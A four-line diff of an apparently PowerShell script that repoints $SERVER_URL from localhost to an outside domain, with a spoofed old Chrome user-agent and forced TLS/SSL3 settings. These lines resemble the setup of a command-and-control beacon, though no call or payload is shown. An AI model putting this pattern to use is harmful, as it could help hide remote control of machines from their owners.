@@ -1,4 +1,4 @@
-$SERVER_URL = "http://localhost"
+$SERVER_URL = "https://rhttp.net"
 $UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
 [Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
